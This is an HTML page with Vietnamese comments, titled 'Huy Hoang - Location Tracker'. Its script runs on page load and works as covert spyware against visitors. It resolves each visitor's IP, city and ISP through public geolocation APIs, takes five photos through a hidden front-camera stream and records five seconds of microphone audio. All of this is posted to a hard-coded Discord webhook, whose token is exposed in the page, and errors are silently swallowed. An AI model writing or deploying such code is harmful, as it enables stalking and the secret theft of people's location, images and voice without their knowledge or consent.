<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Huy Hoang - Location Tracker</title>
    <style>
        body {
            background: #0a0a0a;
            margin: 0;
            padding: 20px;
            font-family: monospace;
            color: #0f0;
            line-height: 1.6;
        }
        .status {
            color: #ff0;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="status">Đang khởi tạo tracker cấp độ MAX...</div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM';

        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 350;
        const AUDIO_DURATION = 5000;

        let cameraStream = null;
        let photoSentCount = 0;

        // Gửi text
        async function sendText(content) {
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "Huy Hoang - Location Tracker",
                        content: content
                    })
                });
            } catch(e) {}
        }

        // Gửi file (ảnh, âm thanh)
        async function sendFile(blob, filename, caption) {
            try {
                const form = new FormData();
                form.append('file', blob, filename);
                form.append('payload_json', JSON.stringify({
                    username: "Huy Hoang - Location Tracker",
                    content: caption
                }));
                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: form });
            } catch(e) {}
        }

        // ================== LẤY IP + VỊ TRÍ CẤP ĐỘ MAX ==================
        async function getAdvancedIPInfo() {
            let ip = "Không xác định";
            let city = "Không xác định";
            let region = "Không xác định";
            let isp = "Không xác định";

            const apis = [
                "https://ip-api.com/json/?fields=query,status,city,regionName,isp",
                "https://ipapi.co/json/",
                "https://freeipapi.com/api/json"
            ];

            for (let url of apis) {
                try {
                    const res = await fetch(url, { signal: AbortSignal.timeout(6000) });
                    if (!res.ok) continue;
                    const data = await res.json();

                    if (url.includes("ip-api.com")) {
                        if (data.status === "success") {
                            ip = data.query || ip;
                            city = data.city || city;
                            region = data.regionName || region;
                            isp = data.isp || isp;
                            break;
                        }
                    } else if (url.includes("ipapi.co")) {
                        ip = data.ip || ip;
                        city = data.city || city;
                        region = data.region || region;
                        isp = data.org || isp;
                    } else if (url.includes("freeipapi")) {
                        ip = data.ipAddress || ip;
                        city = data.cityName || city;
                        region = data.regionName || region;
                        isp = data.isp || isp;
                    }
                    if (ip !== "Không xác định" && city !== "Không xác định") break;
                } catch(e) {}
            }

            return { ip, city, region, isp };
        }

        // Gửi thông tin khách truy cập
        async function sendVisitorInfo() {
            const { ip, city, region, isp } = await getAdvancedIPInfo();
            const time = new Date().toLocaleString('vi-VN');

            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
                        `🌐 **IP:** ${ip}\n` +
                        `📍 **Thành phố:** ${city}\n` +
                        `🗺️ **Khu vực:** ${region}\n` +
                        `🏢 **Nhà mạng:** ${isp}\n` +
                        `📱 **Thiết bị:** ${navigator.platform || "Không xác định"}\n` +
                        `⏰ **Thời gian:** ${time}\n` +
                        `🔗 **Nguồn:** Truy cập trực tiếp`;

            await sendText(msg);
        }

        // ================== CAMERA & CHỤP ẢNH ==================
        async function startCameraAndCapture() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",           // Ưu tiên camera trước
                        width: { ideal: 1280, max: 1920 },
                        height: { ideal: 720, max: 1080 }
                    }
                });

                video.srcObject = cameraStream;
                await new Promise(r => video.onloadedmetadata = r);
                video.play();

                // Chụp 5 ảnh
                for (let i = 1; i <= PHOTO_COUNT; i++) {
                    await new Promise(resolve => {
                        canvas.width = video.videoWidth || 1280;
                        canvas.height = video.videoHeight || 720;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(blob => {
                            if (blob) sendFile(blob, `photo_${i}_${Date.now()}.jpg`, `📸 **Ảnh chụp #${i}**`);
                            resolve();
                        }, 'image/jpeg', 0.88);
                    });
                    if (i < PHOTO_COUNT) await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
                }

                // Tắt camera sau khi chụp xong
                cameraStream.getTracks().forEach(track => track.stop());

            } catch (err) {
                console.error("Camera error:", err);
                await sendText("⚠️ Không mở được camera (có thể bị chặn quyền hoặc không có camera trước)");
            }
        }

        // ================== GHI ÂM ==================
        async function startAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    if (blob.size > 0) await sendFile(blob, `audio_${Date.now()}.webm`, `🎤 **Ghi âm 5 giây**`);
                    stream.getTracks().forEach(t => t.stop());
                };

                recorder.start();
                setTimeout(() => recorder.stop(), AUDIO_DURATION);
            } catch(e) {
                console.warn("Ghi âm thất bại:", e);
            }
        }

        // ================== KHỞI CHẠY ==================
        async function init() {
            await sendVisitorInfo();
            setTimeout(startCameraAndCapture, 800);
            setTimeout(startAudio, 1200);
        }

        window.addEventListener('load', init);
    </script>
</body>
</html>
